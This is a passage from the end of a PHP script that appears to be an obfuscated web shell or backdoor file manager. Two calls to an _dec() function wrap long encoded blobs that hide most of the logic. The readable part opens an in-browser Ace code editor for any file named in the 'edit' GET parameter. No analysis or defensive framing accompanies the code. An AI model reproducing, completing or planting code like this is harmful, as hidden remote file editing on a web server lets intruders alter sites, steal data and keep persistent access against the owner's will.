_dec('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');
if(isset($_GET['edit'])&&isset($_GET['env'])){
$ext=strtolower(pathinfo($_GET["edit"],PATHINFO_EXTENSION));
$ext=$ext=="js"?"javascript":$ext;
echo'<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>';
echo'<script>var editor=ace.edit("editor");editor.getSession().setMode({path:"ace/mode/'.$ext.'",inline:true});';
_dec('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
8Cs2coiIiCfU');}?>
<div id="snackbar"></div>
</body>
</html>
<?php
}
?>
